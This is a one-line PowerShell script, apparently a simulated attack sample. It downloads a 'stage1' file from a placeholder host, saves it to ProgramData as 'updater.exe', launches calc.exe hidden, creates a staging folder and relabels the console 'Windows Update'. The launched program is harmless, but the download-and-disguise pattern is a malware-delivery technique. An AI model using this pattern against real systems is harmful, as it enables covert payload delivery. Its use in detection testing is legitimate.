
$DownloadUrl = "https://contoso.com/stage1.ps1"; $LocalPath = "C:\ProgramData\updater.exe"; $ConnectionTimeout = 129; Invoke-WebRequest -Uri $DownloadUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
